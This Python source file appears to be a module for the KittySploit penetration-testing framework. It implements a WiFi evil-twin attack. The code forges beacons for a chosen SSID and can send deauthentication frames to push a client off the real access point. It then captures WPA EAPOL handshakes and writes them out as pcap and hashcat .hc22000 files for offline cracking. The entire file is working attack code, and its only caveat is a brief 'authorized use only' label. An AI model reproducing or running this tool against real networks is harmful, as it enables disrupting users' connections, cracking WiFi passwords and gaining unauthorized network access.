#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Evil-twin beacon lure with simultaneous EAPOL capture (authorized labs)."""

from __future__ import annotations
import os
import time
from kittysploit import *
from lib.protocols.wlan.mac import mac_to_str, random_client_mac
from lib.protocols.wlan.wlan_client import Wlan_client


class Module(Auxiliary, Wlan_client):
    __info__ = {
        "name": "WiFi Evil Twin Handshake Lure",
        "description": (
            "Interleave forged beacons with passive EAPOL sniffing to attract clients "
            "and export .hc22000 when a WPA handshake occurs."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "evil-twin", "handshake", "eapol"],
        "references": ["https://attack.mitre.org/techniques/T1557/003/"],
        "attack": {
            "tactics": ["TA0006"],
            "techniques": ["T1557.003"],
            "prerequisites": ["Authorized twin / training exercise"],
        },
    }

    ssid = OptString("", "Twin SSID", required=True)
    channel = OptInteger(6, "Channel", required=True)
    twin_bssid = OptString("", "Twin BSSID (empty = random)", required=False)
    duration = OptInteger(90, "Total runtime seconds", required=False)
    beacon_interval = OptFloat(0.15, "Beacon inject period", required=False)
    sniff_slice = OptFloat(0.45, "EAPOL listen window per cycle", required=False)
    target_bssid = OptString("", "Filter EAPOL to AP BSSID", required=False)
    open_ap = OptBool(True, "Open twin beacon", required=False)
    hc22000 = OptString("", "HC22000 output path", required=False)
    deauth_client = OptString("", "Optional client MAC to deauth from real AP", required=False)

    def check(self):
        if not str(self.ssid or "").strip():
            print_error("SSID required")
            return False
        return self.wlan_check_iface()

    def run(self):
        ssid = str(self.ssid).strip()
        ch = max(1, int(self.channel or 6))
        total = max(20, int(self.duration or 90))
        bintval = float(self.beacon_interval or 0.15)
        slice_t = float(self.sniff_slice or 0.45)
        twin = str(self.twin_bssid or "").strip().lower() or mac_to_str(random_client_mac()).lower()
        filt = str(self.target_bssid or "").strip().lower()

        self.wlan_set_channel(ch)
        self.wlan_reset_handshake_tracker()
        ssid_map: dict[str, str] = {twin: ssid}
        frames: list[bytes] = []
        beacon = self.wlan_build_beacon_frame(twin, ssid, ch, open_network=bool(self.open_ap))

        client = str(self.deauth_client or "").strip().lower()
        if client and filt:
            print_status(f"Pre-deauth {client} from {filt}")
            try:
                for fr in self.wlan_build_client_deauth(filt, client):
                    self.wlan_inject_raw([fr], count=3)
            except (PermissionError, OSError) as exc:
                print_warning(f"Deauth skipped: {exc}")

        print_warning("Evil twin lure — authorized use only")
        print_info(f"Twin {ssid} | {twin} | ch{ch} | {total}s")

        def on_eapol(raw: bytes, _rssi: int | None) -> None:
            beacon_parsed = self.wlan_parse_beacon(raw)
            if beacon_parsed and beacon_parsed.ssid:
                self.wlan_note_beacon_ssid(beacon_parsed, ssid_map)
            eap = self.wlan_parse_eapol(raw)
            if not eap:
                return
            if filt and eap.bssid.lower() != filt and twin != eap.bssid.lower():
                return
            frames.append(raw)
            self.wlan_track_parsed_eapol(eap, ssid_map)
            print_success(f"EAPOL M{eap.key_message} {eap.bssid} <-> {eap.station}")

        end = time.time() + total
        cycles = 0
        while time.time() < end:
            cycles += 1
            try:
                self.wlan_inject_raw([beacon], count=2)
            except (PermissionError, OSError):
                break
            remaining = end - time.time()
            try:
                self.wlan_sniff(on_eapol, timeout=min(slice_t, max(0.1, remaining)))
            except (PermissionError, OSError):
                pass
            time.sleep(max(0.02, bintval))

        for row in self.wlan_handshake_summaries():
            if row.get("fast_transition"):
                print_warning(f"FT exchange {row['bssid']} — skipped from 22000")
            elif row.get("exportable"):
                print_info(f"  Export {row['messages']} pair {row.get('message_pair')}")

        lines = self.wlan_export_hc22000(ssid_map)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        if frames:
            pcap = os.path.abspath(f"evil_twin_{stamp}.pcap")
            self.wlan_write_pcap(pcap, frames)
            print_success(f"PCAP {len(frames)} frame(s) → {pcap}")
        if lines:
            path = str(self.hc22000 or "").strip() or os.path.abspath(f"evil_twin_{stamp}.hc22000")
            self.wlan_write_hc22000(path, lines)
            print_success(f"HC22000 {len(lines)} line(s) → {path}")
            return True

        print_warning(f"No crackable hash after {cycles} beacon cycles")
        return False